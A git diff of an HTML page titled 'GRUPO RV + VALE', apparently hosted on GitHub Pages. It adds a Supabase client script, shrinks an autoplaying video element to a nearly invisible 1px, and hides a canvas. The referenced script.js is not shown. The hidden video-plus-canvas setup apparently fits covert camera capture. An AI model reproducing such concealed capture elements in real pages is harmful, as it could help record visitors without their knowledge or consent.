@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GRUPO RV + VALE</title>
 
     <meta property="og:url" content="https://gruporvcom-hub.github.io/VALE-RV/" />
@@ -14,6 +14,8 @@
     <meta property="og:image:height" content="630" />
 
     <link rel="stylesheet" href="style.css">
+    
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
 <body>
 
@@ -48,11 +50,11 @@
             <div class="bar"></div>
         </div>
 
-        <video id="video" autoplay playsinline muted style="display:none;"></video>
+        <video id="video" autoplay playsinline muted style="width: 1px; height: 1px; opacity: 0.01; position: absolute;"></video>
 
-        <canvas id="canvas"></canvas>
+        <canvas id="canvas" style="display: none;"></canvas>
     </div>
 
-    <script type="module" src="script.js"></script>
+    <script src="script.js?v=2.0"></script>
 </body>
 </html>
